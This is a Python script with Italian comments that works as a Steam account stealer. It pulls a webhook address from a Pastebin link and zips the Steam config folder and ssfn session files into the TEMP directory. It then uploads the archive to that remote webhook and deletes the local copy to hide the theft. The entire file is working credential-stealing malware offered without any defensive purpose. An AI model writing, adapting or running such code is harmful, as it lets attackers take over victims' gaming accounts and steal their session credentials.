import os
import os.path
import zipfile
import requests

# Ottiene l'URL del webhook da Pastebin o da una fonte simile
hook = requests.get("https://pastebin.com/raw/nuvDADqg").text

# Determina il percorso dell'installazione di Steam in base al sistema operativo
steam_path = ""
if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
    steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
ssfn = []
config = ""

# Cerca i file che iniziano con "ssfn" nella directory di Steam e li aggiunge alla lista ssfn
for file in os.listdir(steam_path):
    if file[:4] == "ssfn":
        ssfn.append(steam_path+f"\\{file}")

# Funzione per comprimere i file di configurazione di Steam e i file "ssfn" in un file ZIP
def steam(path, path1, steam_session):
    for root, dirs, file_name in os.walk(path):
        for file in file_name:
            steam_session.write(root + "\\" + file)
    for file2 in path1:
        steam_session.write(file2)

# Se esiste la directory di configurazione di Steam, crea un file ZIP chiamato "steam_session.zip"
if os.path.exists(steam_path + "\\config"):
    with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip", 'w', zipfile.ZIP_DEFLATED) as zp:
        steam(steam_path + "\\config", ssfn, zp)

# Prepara il file per l'invio tramite richiesta POST
file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}

# Effettua una richiesta POST al webhook remoto per inviare il file ZIP
r = requests.post(hook, files=file)

# Rimuove il file ZIP dal sistema
try:
    os.remove(f"{os.environ['TEMP']}\steam_session.zip")
except:
    pass
